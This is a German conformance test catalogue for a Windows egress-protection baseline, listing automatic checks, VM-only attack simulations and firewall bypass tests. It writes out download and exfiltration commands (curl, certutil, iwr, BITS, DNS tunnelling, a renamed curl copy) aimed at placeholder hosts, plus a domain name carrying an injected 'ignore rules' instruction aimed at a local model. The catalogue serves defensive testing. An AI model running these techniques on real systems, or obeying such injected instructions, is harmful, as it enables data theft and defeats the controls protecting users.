# EDEP-Konformitätstests

Jede Anforderung aus [SPEC.md](../SPEC.md) hat hier mindestens einen Test. Spalte **Art**:

- **auto** — automatisch geprüft durch [baseline/L1/Test-EdepL1.ps1](../baseline/L1/Test-EdepL1.ps1)
- **aktiv** — Angriffssimulation auf einem Testsystem (niemals auf einem Produktivsystem)
- **Review** — Prüfung von Code, Dokumentation oder Konfiguration

Eine Stufe gilt als erreicht, wenn alle Tests dieser und aller niedrigeren Stufen bestehen (SPEC.md, Abschnitt 2).

## Automatischer Gesamtlauf: `Test-EdepConformance.ps1`

Ein Aufruf für Dritte. Ändert nichts am System.

```powershell
.\conformance\Test-EdepConformance.ps1            # Integrität, 15 L1-Prüfungen, Audit; Protokoll als JSON
.\conformance\Test-EdepConformance.ps1 -Probe     # zusätzlich: Update-Erreichbarkeit messen und Einheitentests ausführen
```

Als Administrator ausführen; ohne Adminrechte sind einige Prüfungen „UNKNOWN“. Das Protokoll
`edep-conformance-<Rechner>-<Datum>.json` enthält:

| Feld | Inhalt |
|---|---|
| `environment` | Rechner, Edition, Build, PowerShell, Adminrechte, ob eine VM erkannt wurde |
| `integrity` | `checksums` (SHA256SUMS gegen die Dateien) und `signature` (SSH-Signatur, siehe [SIGNING.md](../docs/SIGNING.md)); Status PASS, WARN (nur Zeilenenden), FAIL oder SKIPPED |
| `l1` | die 15 Prüfungen mit Status und Detail (Anforderung, Testkennung, Art `auto`) |
| `unitTests` | nur mit `-Probe`: bestanden, fehlgeschlagen |
| `destructive` | nur mit `-Destructive`: Schritte mit Erwartung und Beobachtung, `fingerprintIdentical`, oder `refused` mit den Gründen |
| `audit` | Punktzahl, Stufe und Zähler des Audits |
| `notRun` | die Tests dieser Stufe, die **nicht** laufen (Art `aktiv` und `Review`, Umgehungstests T-BYP) |
| `verdict` | Exit-Code und Text |

**Stufe „Destructive“ (`-Destructive -ConfirmDestructive`): ändert das System, nur in einer Test-VM.**

```powershell
# in einer Hyper-V-VM mit Prüfpunkt, als Administrator, ohne angewendetes EDEP:
.\conformance\Test-EdepConformance.ps1 -Destructive -ConfirmDestructive -SkipIntegrity
```

Die Stufe verweigert den Lauf (Exit-Code nicht 0, Gründe im Protokoll unter `destructive.refused`), wenn Adminrechte fehlen,
keine virtuelle Maschine erkannt wird, `-ConfirmDestructive` fehlt, EDEP schon angewendet ist oder ausgehend schon auf `Block`
steht. Sie führt aus: Fingerabdruck sichern, Install im Audit-Modus (Prüfung: nur EDEP-NET-03 nicht erfüllt, `curl.exe` blockiert,
umbenannte Kopie kommt durch), Install im Enforce-Modus mit `-AllowWindowsUpdate` (alle 15 Prüfungen erfüllt, `curl.exe` und die
Kopie blockiert, BITS zu `example.org` gelingt nicht), Umgehungen (beschreibbarer Pfad bei `-AllowProgram`, Authenticated-Bypass-Regel,
uneingeschränkte Erlaubnisregel, jeweils mit Prüfung und Entfernen), dann `Restore-EdepL1` und Fingerabdruck-Vergleich. Ein
Abbruch löst `Restore-EdepL1` aus, angelegte Testregeln werden entfernt. Das Protokoll enthält den Abschnitt `destructive` mit
einem Eintrag je Schritt (Erwartung, Beobachtung, Status `PASS`, `FAIL` oder `NOT_ASSESSABLE`); die ausgeführten Tests verschwinden
aus `notRun`. **Gemessen:** Enterprise-VM, 13 von 13 Schritten ([Protokoll](runs/2026-10-04-Enterprise25H2-26200.9550-HyperV-Destructive/run.md)); Pro noch nicht. **Danach ordentlich neu starten und `Test-EdepL1` ausführen** ([E-76](../docs/EVIDENCE.md)). Die Ausgabe dieser Stufe
ist nur deutsch.

**Exit-Code:** 0 = alle automatisch geprüften L1-Anforderungen erfüllt und Integrität bestätigt; 1 = mindestens eine
Abweichung; 2 = Ergebnis unvollständig (UNKNOWN, Integrität nicht prüfbar oder nur Zeilenenden abweichend).

**Grenzen:** Das Protokoll hält fest, was gemessen wurde. Es ist **kein Konformitätsnachweis**: Die Angriffssimulationen
(`aktiv`) und Prüfungen (`Review`) unter `notRun` laufen nicht, sie gehören in eine Test-VM ([TESTPLAN-L1.md](../docs/TESTPLAN-L1.md)).
Die Prüfsummen gelten für den **ZIP-Stand eines Tags**; ein Klon unter Windows liefert wegen der Zeilenenden WARN.

## L1 — Baseline

| Test      | Anforderung | Art    | Verfahren                                                                                                                | Erwartung                                                                     |
| --------- | ----------- | ------ | ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| T-NET-01  | EDEP-NET-01 | auto   | `Get-NetFirewallProfile -PolicyStore ActiveStore`                                                                        | alle Profile `Enabled`, `DefaultInboundAction = Block`                        |
| T-NET-02 | EDEP-NET-02 | auto | `DisableStealthMode` in allen Richtlinienschlüsseln (`DomainProfile`, `PrivateProfile`, `StandardProfile`, `PublicProfile`) und lokalen Firewall-Schlüsseln | nicht vorhanden oder 0 |
| T-NET-02a | EDEP-NET-02 | aktiv  | Von einem zweiten Host: `nmap -Pn -sS -p 1-1024 <ziel>`                                                                  | alle Ports `filtered`, keine RST-Antworten                                    |
| T-NET-03 | EDEP-NET-03 | auto | wie T-NET-01; zusätzlich: keine aktive ausgehende Erlaubnisregel ohne jede Einschränkung (`Get-EdepUnrestrictedOutboundAllowRule`) | `DefaultOutboundAction = Block` in allen Profilen und keine uneingeschränkte Erlaubnisregel |
| T-NET-03a | EDEP-NET-03 | aktiv  | Unsigniertes Testprogramm (z. B. frisch kompiliertes `nc.exe`) verbindet sich zu einem externen Host                     | Verbindung schlägt fehl; Ereignis 5157 mit Programmpfad                       |
| T-NET-03b | EDEP-NET-03 | aktiv | Testregel anlegen: `New-NetFirewallRule -DisplayName 'EDEP-Test-offen' -Direction Outbound -Action Allow -Profile Any`; `Test-EdepL1.ps1`; danach `Remove-NetFirewallRule -DisplayName 'EDEP-Test-offen'` | NET-03 meldet FAIL und nennt die Regel; nach dem Löschen wieder PASS |
| T-NET-03c | EDEP-NET-03, EDEP-NET-10 | auto | `tools/Test-EdepUnits.ps1` (läuft in der CI) | alle Einheitentests bestehen; bei entfernter Korrektur schlagen sie fehl (Mutationstest 2026-10-02) |
| T-NET-04 | EDEP-NET-04 | auto | Blockregeln gegen Anhang-A-Liste; ausgehende Regeln mit `OverrideBlockRules` | jede vorhandene Datei hat eine ausgehende Blockregel; keine Authenticated-Bypass-Regel |
| T-NET-04a | EDEP-NET-04 | aktiv  | `curl.exe https://example.org`, `certutil -urlcache -f https://example.org x`, `powershell -c "iwr https://example.org"` | alle scheitern; Ereignis 5157 je Versuch                                      |
| T-NET-04b | EDEP-NET-04 | aktiv  | Zusätzliche Erlaubnisregel „alles ausgehend für curl.exe“ anlegen, T-NET-04a wiederholen                                 | scheitert weiterhin (Vorrang der Blockregel)                                  |
| T-NET-05  | EDEP-NET-05 | auto   | Eingehende Blockregeln im Profil Public                                                                                  | TCP 135, 445, 3389, 5985, 5986 gesperrt                                       |
| T-NET-10 | EDEP-NET-10 | auto | ACL jeder Datei mit ausgehender Erlaubnisregel und ihrer Ordner (`Get-Acl`) | nur SYSTEM, Administratoren, TrustedInstaller dürfen ändern |
| T-NET-10a | EDEP-NET-10 | aktiv | `Install-EdepL1.ps1 -AllowProgram <Pfad unter %LOCALAPPDATA%>` | Abbruch mit Verweis auf EDEP-NET-10 |
| T-ID-01   | EDEP-ID-01  | auto   | `CiTool --list-policies -json`                                                                                           | mind. eine aktive, nicht systemeigene Richtlinie                              |
| T-TEL-01  | EDEP-TEL-01 | auto   | `AllowTelemetry` + Edition                                                                                               | niedrigster von der Edition unterstützter Wert; WARN auf Home/Pro             |
| T-TEL-02 | EDEP-TEL-02 | auto | Blockregeln mit Dienstfilter; `sc.exe qsidtype` | `DiagTrack`, `dmwappushservice` ausgehend blockiert, SID-Typ RESTRICTED/UNRESTRICTED |
| T-TEL-02a | EDEP-TEL-02 | aktiv  | 24 h Firewall-Log / Ereignis 5157 auswerten                                                                              | Verbindungsversuche von DiagTrack sind verworfen, keine erfolgreichen         |
| T-TEL-03  | EDEP-TEL-03 | auto   | Registrierungswerte                                                                                                      | wie in SPEC.md                                                                |
| T-TEL-04  | EDEP-TEL-04 | auto   | Blockregeln gegen Update-Dienste; bei Outbound-Block Erlaubnisregeln vorhanden; Defender-Pfad aktuell                    | keine Blockade, Regeln vorhanden                                              |
| T-TEL-04a | EDEP-TEL-04 | aktiv  | `UsoClient StartScan` bzw. Einstellungen → Windows Update → „Nach Updates suchen“; `Update-MpSignature`                  | beides erfolgreich                                                            |
| T-LOG-01  | EDEP-LOG-01 | auto   | `LogBlocked` aller Profile; Überwachung Filterplattformverbindung (Fehler)                                               | aktiv                                                                         |
| T-LOG-02  | EDEP-LOG-02 | auto   | `LogFileName`                                                                                                            | kein UNC-Pfad                                                                 |
| T-LOG-06 | EDEP-LOG-06 | auto | `Get-WinEvent -ListLog Microsoft-Windows-Bits-Client/Operational` | `IsEnabled = True` |
| T-OPS-01  | EDEP-OPS-01 | auto   | `%ProgramData%\EDEP\backup\*\manifest.json` + `firewall.wfw`                                                             | vorhanden                                                                     |
| T-OPS-01a | EDEP-OPS-01 | aktiv  | `Restore-EdepL1.ps1` ausführen, danach `Test-EdepL1.ps1`                                                                 | Ausgangszustand wiederhergestellt; Test zeigt wieder die ursprünglichen FAILs |
| T-OPS-02  | EDEP-OPS-02 | Review | `Install-EdepL1.ps1` ohne `-Enforce`                                                                                     | ausgehend bleibt `Allow`, alles andere angewendet                             |
| T-OPS-05  | EDEP-OPS-05 | Review | Produktbeschreibung, README                                                                                              | keine Sicherheitsaussage über UI-Hooks                                        |
| T-INF-04  | EDEP-INF-04 | Review | `certlm.msc` / `Get-ChildItem Cert:\LocalMachine\Root`                                                                   | keine Stammzertifizierungsstelle der Implementierung                          |

## L2 — Enforced

| Test     | Anforderung | Art           | Verfahren                                                                                               | Erwartung                                                                                                 |
| -------- | ----------- | ------------- | ------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| T-NET-06 | EDEP-NET-06 | aktiv         | `nslookup example.org 1.1.1.1` (Resolver nicht konfiguriert) aus beliebigem Programm                    | blockiert; Auflösung über den DNS-Client-Dienst funktioniert                                              |
| T-NET-07 | EDEP-NET-07 | Review + auto | `netsh wfp show filters`                                                                                | Filter des Agenten nur in eigenem Provider/Sublayer; fremde Filter unverändert (Vorher-Nachher-Vergleich) |
| T-NET-08 | EDEP-NET-08 | aktiv + Review | `netsh wfp show filters`; Agentendienst deaktivieren, neu starten, sofort T-NET-03a | je Ebene ein Filter mit BOOTTIME und ein getrennter mit PERSISTENT, keiner mit beiden; Provider mit Dienstname; blockiert ab Boot |
| T-ID-02  | EDEP-ID-02  | auto          | `CiTool --list-policies -json`                                                                          | Richtlinie ohne Option „Audit Mode“                                                                       |
| T-ID-03  | EDEP-ID-03  | aktiv         | Zugelassenes Programm kopieren und Kopie 1 Byte verändern (Overlay anhängen)                            | Kopie mit Hash-Bindung: blockiert; Signaturprüfung schlägt fehl → blockiert                               |
| T-ID-04  | EDEP-ID-04  | aktiv         | Zugelassene Datei (Hash-Bindung) durch neue Version ersetzen                                            | Netzwerkrecht erlischt bis zur Freigabe                                                                   |
| T-ID-05  | EDEP-ID-05  | Review        | Richtlinie und WFP-Filter                                                                               | keine Regel für `svchost.exe` ohne Dienst-Bedingung                                                       |
| T-TEL-05 | EDEP-TEL-05 | auto          | `Get-Service DiagTrack`                                                                                 | `StartType = Disabled`                                                                                    |
| T-LOG-03 | EDEP-LOG-03 | aktiv         | Als Admin eine Filter-ID des Agenten löschen bzw. `Set-NetFirewallProfile -DefaultOutboundAction Allow` | Ereignis „Manipulation“ ≤ 60 s; Soll-Zustand wiederhergestellt                                            |
| T-LOG-04 | EDEP-LOG-04 | aktiv         | T-NET-03a                                                                                               | Protokolleintrag mit Zeit, Identität, Ziel, Regel-ID                                                      |
| T-LOG-05 | EDEP-LOG-05 | aktiv         | Eine Zeile aus dem Protokoll entfernen, Prüfwerkzeug ausführen                                          | Kettenbruch wird gemeldet                                                                                 |
| T-OPS-03 | EDEP-OPS-03 | aktiv         | Wartungsmodus aktivieren, 31 min warten                                                                 | Modus endet automatisch; Beginn und Ende protokolliert                                                    |
| T-OPS-04 | EDEP-OPS-04 | aktiv         | Agentenprozess hart beenden (`taskkill /f`), T-NET-03a                                                  | weiterhin blockiert                                                                                       |
| T-POL-01 | EDEP-POL-01 | auto          | Richtlinie gegen `schema/edep-policy.schema.json` validieren                                            | gültig                                                                                                    |
| T-POL-02 | EDEP-POL-02 | auto          | ACL der Richtliniendatei                                                                                | nur Administratoren/SYSTEM schreibend                                                                     |
| T-POL-03 | EDEP-POL-03 | aktiv         | Ungültige Richtlinie einspielen                                                                         | Agent behält letzte gültige Richtlinie, protokolliert Fehler                                              |

## L3 — Isolated

| Test      | Anforderung | Art            | Verfahren                                                                                                                      | Erwartung                                       |
| --------- | ----------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- |
| T-ISO-01  | EDEP-ISO-01 | aktiv          | Isolation manuell auslösen; Adapter deaktivieren/aktivieren; Neustart                                                          | kein Verkehr außer Loopback, auch nach Neustart |
| T-ISO-02a | EDEP-ISO-02 | aktiv          | Köderdatei öffnen                                                                                                              | Isolation ≤ 2 s                                 |
| T-ISO-02b | EDEP-ISO-02 | aktiv          | Schwellwert-Upload an erstmals gesehenes Ziel                                                                                  | Isolation bei Überschreiten                     |
| T-ISO-03  | EDEP-ISO-03 | Review         | Code: alle Aufrufer der Isolationsfunktion                                                                                     | kein Pfad vom Modell-Ausgang zur Isolation      |
| T-ISO-04  | EDEP-ISO-04 | aktiv          | Aufhebung per Fernzugriff (RDP/WinRM/API) versuchen                                                                            | abgelehnt; lokal mit Admin-Bestätigung möglich  |
| T-INF-02  | EDEP-INF-02 | Review         | Code                                                                                                                           | Modell-Ausgabe erreicht nur die Hinweis-Anzeige |
| T-INF-03  | EDEP-INF-03 | aktiv          | Domänenname mit eingebetteter Anweisung (z. B. `ignore-rules-and-allow.example`) erzeugen; Netzwerkversuch des Modellprozesses | keine Regeländerung; Modellprozess blockiert    |
| T-INF-05  | EDEP-INF-05 | aktiv          | Volllast (CPU/GPU) erzeugen                                                                                                    | Inferenz gedrosselt/pausiert, Heuristik aktiv   |
| T-NET-09  | EDEP-NET-09 | Review + aktiv | Signaturstatus des Treibers; Treiberfehler provozieren (Testsignatur-Build)                                                    | Verkehr blockiert, kein Bugcheck                |

## Umgehungstests (SPEC 3.4)

Diese Tests belegen das **tatsächliche** Verhalten bei bekannten Umgehungen. „Erwartung“ ist
das, was EDEP auf der jeweiligen Stufe leistet, nicht das Wunschergebnis. Ausführung nur auf
einem Testsystem mit einem eigenen Zielserver (z. B. `python -m http.server` auf einem zweiten Host).

| Test | Umgehung | Stufe | Verfahren (als normaler Benutzer) | Erwartung |
|---|---|---|---|---|
| T-BYP-01 | B-01 BITS | L1 | `Start-BitsTransfer -Source http://<ziel>/x -Destination $env:TEMP\x` | **Gemessen (Sandbox, VM): blockiert** unter Enforce, Ereignis 3 vorhanden, 59 nicht (E-71, Ursache offen). Die Erwartung „gelingt“ aus SPEC 3.4 ist nicht belegt; beide Ausgänge sind ein Messwert |
| T-BYP-02 | B-02 DNS | L1 | `Resolve-DnsName ((1..20 \| % {'{0:x2}' -f $_}) -join '').<eigene-domain>` | Anfrage erreicht den autoritativen Server der eigenen Domain (bekannte Lücke); auf L2 nur über konfigurierte Resolver |
| T-BYP-03 | B-03 erlaubtes Programm | L1 | Erlaubten Browser per Kommandozeile mit Ziel-URL starten | **Verbindung gelingt** (Grenze jeder programmbasierten Firewall) |
| T-BYP-04 | B-04 ersetzbarer Pfad | L1 | Freigabe für ein Programm unter `%LOCALAPPDATA%` versuchen | Install bricht ab (NET-10); ein vorhandener Fall wird von T-NET-10 als FAIL gemeldet |
| T-BYP-05 | B-05 Authenticated Bypass | L1 | Als Admin ausgehende Regel mit `-OverrideBlockRules $true` anlegen, dann T-NET-04 | T-NET-04 meldet FAIL |
| T-BYP-06 | B-06 fremder Sublayer | L2 | Als Admin Sublayer mit Gewicht 0xFFFF und hard permit anlegen | Manipulationsereignis (LOG-03) ≤ 60 s |
| T-BYP-07 | B-07 umbenannte LOLBin | L1 | `copy C:\Windows\System32\curl.exe $env:TEMP\x.exe; & $env:TEMP\x.exe https://example.org` | Audit-Modus: **gelingt**. Enforce-Modus: blockiert, Ereignis 5157 |
| T-BYP-08 | B-08 uneingeschränkte Regel | L1 | Regel wie in T-NET-03b anlegen, danach den `x.exe`-Test aus T-BYP-07 im Enforce-Modus | Das Programm kommt **durch**; NET-03 meldet FAIL; nach dem Löschen der Regel wird es blockiert |
